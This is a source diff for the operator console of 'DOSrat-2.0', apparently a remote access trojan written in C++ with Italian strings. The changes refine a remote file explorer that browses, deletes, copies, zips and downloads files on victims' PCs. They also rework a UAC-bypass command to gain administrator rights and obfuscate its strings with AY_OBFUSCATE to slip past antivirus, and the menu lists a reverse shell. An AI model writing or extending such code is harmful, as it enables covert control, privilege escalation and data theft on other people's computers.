@@ -203,7 +203,10 @@ bool AutoAggiornamento()
     if(!du.WriteFile(MFP + "Update.vbs", UpdateVBS))
         return false;
 
-    su.NoOutputCMD("start \"\" \"" + MFP + "Update.vbs\"");
+    du.WriteFile(MFP + "Release note.txt", gh.GetLastReleaseBody("Criper98", "DOSrat-2.0"));
+
+    du.RunFile(MFP + "Update.vbs");
+    du.RunFile(MFP + "Release note.txt");
 
     return true;
 }
@@ -214,7 +217,7 @@ void VerificaAggiornamenti(bool AutoUpdate)
     EasyMSGB msgb;
     SystemUtils su;
 
-    string CurrTag = gh.GetRepoTag("criper98", "dosrat-2.0");
+    string CurrTag = gh.GetLastReleaseTag("criper98", "dosrat-2.0");
 
     if (CurrTag != Version && CurrTag.find("-1 errore") == string::npos)
     {
@@ -333,6 +336,7 @@ bool RestartServer(TcpIP &Server, int Port)
         {
             closesocket(Clients[i].sock);
             Clients[i].IsConnected = false;
+            Clu->AggiornaTitolo();
         }
 
     Server.Stop();
@@ -341,7 +345,6 @@ bool RestartServer(TcpIP &Server, int Port)
         return false;
 
     Sleep(1000);
-    Clu->AggiornaTitolo();
 
     ServerLoopController = true;
 
@@ -665,7 +668,7 @@ short FileExplorer(SOCKET Sock, int ID)
             {
                 j.clear();
 
-                if (!cfe.CurrSelectionInfo().Type) // Directory
+                if (!cfe.CurrSelectionInfo().IsFile) // Directory
                 {
                     j["Action"] = "OpenDir";
                     j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
@@ -776,7 +779,7 @@ short FileExplorer(SOCKET Sock, int ID)
 
                 j["Action"] = "Delete";
                 j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
-                j["Type"] = cfe.CurrSelectionInfo().Type;
+                j["Type"] = cfe.CurrSelectionInfo().IsFile;
 
                 cout << "Loading ";
                 cli.OneCharBar();
@@ -937,7 +940,7 @@ short FileExplorer(SOCKET Sock, int ID)
                 string FileName;
                 string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;
 
-                if (!cfe.CurrSelectionInfo().Type)
+                if (!cfe.CurrSelectionInfo().IsFile)
                 {
                     cfe.UpdateContent();
                     cout << "Please select a file, for directory use ZIP first.";
@@ -1081,7 +1084,7 @@ short FileExplorer(SOCKET Sock, int ID)
                 if (cfe.CurrSelectionInfo().Name != "..\\")
                 {
                     cfe.CutCopy.CutOrCopy = false;
-                    cfe.CutCopy.Type = cfe.CurrSelectionInfo().Type;
+                    cfe.CutCopy.IsFile = cfe.CurrSelectionInfo().IsFile;
                     cfe.CutCopy.PathToCutCopy = cfe.CurrSelectionInfo().FullPath;
                     cfe.CutCopy.Name = cfe.CurrSelectionInfo().Name;
                     cfe.UpdateContent();
@@ -1097,7 +1100,7 @@ short FileExplorer(SOCKET Sock, int ID)
                 if (cfe.CurrSelectionInfo().Name != "..\\")
                 {
                     cfe.CutCopy.CutOrCopy = true;
-                    cfe.CutCopy.Type = cfe.CurrSelectionInfo().Type;
+                    cfe.CutCopy.IsFile = cfe.CurrSelectionInfo().IsFile;
                     cfe.CutCopy.PathToCutCopy = cfe.CurrSelectionInfo().FullPath;
                     cfe.CutCopy.Name = cfe.CurrSelectionInfo().Name;
                     cfe.UpdateContent();
@@ -1117,7 +1120,7 @@ short FileExplorer(SOCKET Sock, int ID)
 
                 j["Action"] = "CopyCut";
                 j["CutOrCopy"] = cfe.CutCopy.CutOrCopy;
-                j["Type"] = cfe.CutCopy.Type;
+                j["Type"] = cfe.CutCopy.IsFile;
                 j["Path"] = en.AsciiToUnicode(cfe.CutCopy.PathToCutCopy);
                 j["Name"] = en.AsciiToUnicode(cfe.CutCopy.Name);
 
@@ -1172,7 +1175,7 @@ short FileExplorer(SOCKET Sock, int ID)
 
                 j["Action"] = (ToLowerCase(cfe.CurrSelectionInfo().Name.substr(cfe.CurrSelectionInfo().Name.size() - 4)) == ".zip") ? "Unzip" : "Zip";
                 j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
-                j["Name"] = (cfe.CurrSelectionInfo().Type) ? en.AsciiToUnicode(cfe.CurrSelectionInfo().Name) : en.AsciiToUnicode(cfe.CurrSelectionInfo().Name.substr(0, cfe.CurrSelectionInfo().Name.size() - 1));
+                j["Name"] = (cfe.CurrSelectionInfo().IsFile) ? en.AsciiToUnicode(cfe.CurrSelectionInfo().Name) : en.AsciiToUnicode(cfe.CurrSelectionInfo().Name.substr(0, cfe.CurrSelectionInfo().Name.size() - 1));
 
                 cout << "Loading ";
                 cli.OneCharBar();
@@ -1209,11 +1212,23 @@ short FileExplorer(SOCKET Sock, int ID)
 
 short BypassUAC(SOCKET Sock, int ID)
 {
-	string Res = COMUNICAZIONI::PingPong(Sock, "bypassuac");
+    TextColor tc;
+
+    cout << "Tentativo in corso..." << endl;
+
+	string Res = COMUNICAZIONI::PingPong(Sock, (string)AY_OBFUSCATE("bypassuac"));
 	
+    if (Res == "")
+    {
+        Sleep(1000);
+        TcpIP::RecvString(Sock, Res);
+    }
+    
 	if (Res == "OK")
 	{
-		cout << "Bypass eseguito, riavvio del Client in corso..." << endl;
+        tc.SetColor(tc.Lime);
+		cout << AY_OBFUSCATE("Bypass eseguito, riavvio del Client in corso...") << endl;
+        tc.SetColor(tc.Default);
 		Sleep(1500);
         closesocket(Sock);
         Clients[ID].IsConnected = false;
@@ -1222,10 +1237,16 @@ short BypassUAC(SOCKET Sock, int ID)
 	}
 	else if (Res == "NO")
 	{
-		cout << "Bypass non riuscito." << endl;
+        tc.SetColor(tc.Yellow);
+		cout << AY_OBFUSCATE("Bypass non riuscito.") << endl;
+        tc.SetColor(tc.Default);
 		return 1;
 	}
 	
+    tc.SetColor(tc.Red);
+    cout << "Operazione bloccata dall'AV." << endl;
+    tc.SetColor(tc.Default);
+
 	return 2;	
 }
 
@@ -1271,7 +1292,7 @@ void Sessione(int ID, SOCKET Sock)
             cout << char(192) << char(196) << "Revshell" << endl;
             StampaHelp("Filexplorer\t", "- Gestisci i file del PC remoto.");
             cout << char(192) << char(196) << "explorer" << endl;
-			StampaHelp("BypassUAC\t", "- Prova a bypassare l'UAC e ottenere privilegi amministrativi.");
+			StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
             cout << endl;
 
             cli.SubTitle("Utility", 30, tc.Purple);
@@ -1385,25 +1406,28 @@ void Sessione(int ID, SOCKET Sock)
                 }
             }
         }
-		else if (cmd == "bypassuac")
+		else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
 		{
 			if (Clients[ID].info.CompatibleVer < 2)
                 StampaIncompatibile();
 			else
 			{
-				switch (BypassUAC(Sock, ID))
-				{
-					case 0:
-						Controllo = false;
-						break;
+                if (Clients[ID].info.UAC == "Admin")
+                    cout << "Il Client e' gia' amministratore." << endl;
+                else
+				    switch (BypassUAC(Sock, ID))
+				    {
+					    case 0:
+						    Controllo = false;
+						    break;
 						
-					case 1:
-						break;
+					    case 1:
+						    break;
 						
-					case 2:
-						Controllo = CheckConnection(Sock, ID);
-						break;
-				}
+					    case 2:
+						    Controllo = CheckConnection(Sock, ID);
+						    break;
+				    }
 			}
 		}
         else
